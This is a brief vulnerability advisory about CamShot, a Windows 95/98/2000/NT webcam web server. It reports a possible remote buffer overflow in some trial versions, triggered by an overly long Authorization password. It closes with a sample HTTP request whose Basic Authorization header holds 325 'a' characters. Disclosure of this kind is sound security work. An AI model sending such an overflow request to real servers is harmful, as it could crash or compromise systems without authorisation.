CamShot is a Windows 95/98/2000/NT web server that serves up web pages containing time stamped images captured from a video camera. The images can be viewed from anywhere on the network with a web browser. CamShot works with Video For Windows compatible video equipment. Certain trial versions of this software contain a possibly exploitable remote buffer overflow by way of a overly long user supplied 'Authorization' password.

It is not known if supported commercial versions of this software contain the same vulnerability.

Example:

GET / HTTP/1.1<enter>
Authorization: Basic ['a'x325]<enter><enter>
